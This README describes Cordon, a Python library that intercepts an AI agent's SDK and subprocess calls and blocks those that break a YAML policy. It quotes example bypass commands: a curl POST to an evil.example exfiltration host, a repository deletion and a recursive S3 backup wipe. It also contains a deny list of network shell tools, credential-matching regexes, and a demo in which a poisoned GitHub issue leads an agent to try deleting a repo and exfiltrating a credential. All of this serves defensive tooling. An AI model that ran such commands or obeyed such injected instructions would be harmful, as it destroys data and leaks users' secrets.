# Cordon

> Runtime security for AI agents — stops dangerous actions **before they leave the process**.

Cordon is a Python library that wraps the SDKs an AI agent uses
(`boto3`, `PyGithub`, `slack_sdk`, `requests`, `httpx`) and evaluates every
outbound call against a YAML policy. Destructive actions — deleting a
repository, terminating EC2 instances, attaching IAM policies, exfiltrating
credentials over HTTP — are blocked at the chokepoint and audited.

**One line activates it:**

```python
import cordon
cordon.init()
```

After that, any patched SDK call goes through the policy. Allowed calls
behave normally; denied calls raise `CordonDenied` and are recorded
to a JSONL audit log.

---

## Status

**v0.1** — runs the canonical before/after demo (see below). API and policy
schema are subject to change. Not yet on PyPI; install from git (see below).

## Install

Until the first PyPI release, install directly from git:

```bash
# core + all SDK extras
pip install "cordon-sdk[github,aws,slack,http] @ git+https://github.com/egrs-io/cordon-py.git"

# pinned to a release tag (recommended for production)
pip install "cordon-sdk @ git+https://github.com/egrs-io/cordon-py.git@v0.1.0"

# local development (after cloning)
pip install -e ".[dev]"
```

Runtime dependencies are minimal: only `wrapt` and `PyYAML`. The SDKs
(`boto3`, `PyGithub`, `slack_sdk`, `httpx`, `requests`) are optional extras —
the package imports and runs even if none of them are installed.

## What gets intercepted

One chokepoint per SDK. If the SDK isn't installed, the shim silently skips.
If the chokepoint's signature has changed in a newer SDK version, the shim
logs a warning and leaves the SDK unpatched rather than crashing the host
application.

| SDK / runtime | Chokepoint                                                       | Vendor key    |
| ------------- | ---------------------------------------------------------------- | ------------- |
| boto3         | `botocore.client.BaseClient._make_api_call`                      | `aws:<svc>`   |
| PyGithub      | `github.Requester.Requester.requestJsonAndCheck`                 | `github`      |
| slack_sdk     | `slack_sdk.web.base_client.BaseClient.api_call`                  | `slack`       |
| requests      | `requests.sessions.Session.request` (catch-all)                  | `http`        |
| httpx         | `httpx.Client.send` and `httpx.AsyncClient.send` (catch-all)     | `http`        |
| subprocess    | `subprocess.Popen.__init__` (bypass guard)                       | `subprocess`  |

The catch-all shims (`requests`, `httpx`) defer to whichever vendor-specific
shim is already governing the call, so PyGithub → requests doesn't double-audit.

### The `subprocess` shim is a bypass guard

The SDK shims only matter if every path *out* of the process is covered.
An agent that can shell out walks around them:

```python
# These would bypass every SDK shim above:
subprocess.run(["curl", "-X", "POST", "https://evil.example/exfil", ...])
subprocess.run(["gh", "repo", "delete", "acme/widget"])
subprocess.run(["aws", "s3", "rm", "s3://prod-backups", "--recursive"])
```

The `subprocess` shim closes that loophole. The default policy denies:

| Category               | Binaries denied                                                                                                                  |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| Network CLIs           | `curl`, `wget`, `gh`, `aws`, `gcloud`, `az`, `kubectl`, `ssh`, `scp`, `sftp`, `rsync`, `nc`/`netcat`, `socat`, `nmap`, `ftp`, `telnet`, `http`/`httpie` |
| `git` (network only)   | `push`, `fetch`, `pull`, `clone`, `fetch-pack`, `send-pack`, `ls-remote`, `remote` — `git status` / `git log` / `git --version` still work |
| `docker` (network only)| `pull`, `push`, `login`, `logout`, `search` — `docker ps` / `docker logs` still work                                              |

The philosophy: **agents should use the SDK or an MCP server.** Shelling
out to a network CLI is, by definition, a policy bypass.

> **Known gap:** `os.system()` is a direct libc call and does not pass
> through `subprocess.Popen`. It is not covered. If your agents use
> `os.system`, either remove those calls or fork the shim to wrap it too.

## Policy

Plain YAML. A list of rules; deny rules win; default is configurable.

```yaml
version: 1
default: allow
rules:
  - id: block-github-repo-delete
    when: { vendor: github, method: DELETE, path: '^/repos/[^/]+/[^/]+$' }
    action: deny
    reason: "Repository deletion is destructive and irreversible."

  - id: block-aws-iam-writes
    when: { vendor: 'aws:iam', operation: '^(Create|Update|Put|Attach|Detach|Delete)' }
    action: deny
    reason: "IAM modifications can escalate privilege."

  - id: block-secret-exfiltration
    when:
      vendor: http
      body_matches: '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-ant-[A-Za-z0-9-]{20,})'
    action: deny
    reason: "Outbound body contains a credential pattern."

  - id: block-unknown-egress
    when:
      vendor: http
      host_not_in: ['api.github.com', 'slack.com', '*.amazonaws.com']
    action: deny
    reason: "Outbound HTTP to a host that is not on the allowlist."
```

Supported `when` predicates:

| predicate      | type                | matches when…                                        |
| -------------- | ------------------- | ---------------------------------------------------- |
| `vendor`       | regex (`re.search`) | call's vendor key matches                            |
| `method`       | regex               | HTTP method matches                                  |
| `operation`    | regex               | SDK operation name matches                           |
| `path`         | regex               | URL path matches                                     |
| `host`         | regex               | URL host matches                                     |
| `body_matches` | regex               | serialized request body matches anywhere             |
| `host_not_in`  | list of patterns    | host is NOT in the allowlist (`*` wildcards allowed) |

A rule matches when **all** of its predicates match. Anchor regexes
explicitly (`^…$`) for exact matches. See `policies/agent-default.yaml`
for the full default pack.

## Public API

```python
cordon.init(
    policy = "policies/agent-default.yaml",   # path or in-memory dict
    audit  = "egress-audit.jsonl",             # path; None disables file sink
    audit_stdout = False,                       # also write to stdout
    mode   = "enforce",                         # "enforce" blocks; "monitor" logs only
    on_error = "open",                          # internal-error behavior (see below)
)

cordon.uninstall()                     # remove all patches

class CordonDenied(CordonError):
    vendor: str
    operation: str | None
    rule_id: str | None
    reason: str | None
```

**Modes**

- `enforce` (default): denied calls raise `CordonDenied`.
- `monitor`: every call is audited with its decision, but nothing is blocked.

**`on_error`** governs what happens if cordon-sdk's *own* code throws an
internal error (a bug, a malformed policy, an audit write failure):

- `open` (default): log a warning and call through, so the host application
  never breaks because of us.
- `closed`: re-raise the internal error.

A policy `deny` in `enforce` mode always raises — `on_error` only affects
internal errors.

## Audit

Each call writes one JSON object per line to the configured sink:

```json
{"ts":"2026-05-27T18:14:09Z","session_id":"a3f1c9b2","vendor":"github",
 "operation":"DELETE /repos/acme/widget","decision":"deny",
 "reason":"Repository deletion is destructive and irreversible.",
 "rule_id":"block-github-repo-delete","args":null}
```

Anything matching a known secret pattern in the recorded args is replaced
with `***` before serialization.

## Run the demo

```bash
python examples/demo/run_demo.py
```

It runs the "toxic chain" twice — an AI agent reads a poisoned GitHub
issue and tries to delete a repo and exfiltrate a credential. The first
pass has cordon-sdk off; the second has it on. The contrast is the
whole pitch. See `examples/demo/README.md` for details.

## Tests

```bash
pytest
```

84 tests across:

- `test_policy.py` — YAML loader and matcher
- `test_audit.py` — JSONL writer and redaction
- `test_canonical.py` — canonical request shape
- `test_core.py` — init, uninstall, reentrancy guard, modes
- `test_<sdk>_shim.py` — one file per shim, deny + allow + idempotency + uninstall
- `test_end_to_end.py` — every default-policy rule exercised end-to-end

## License

Apache-2.0.
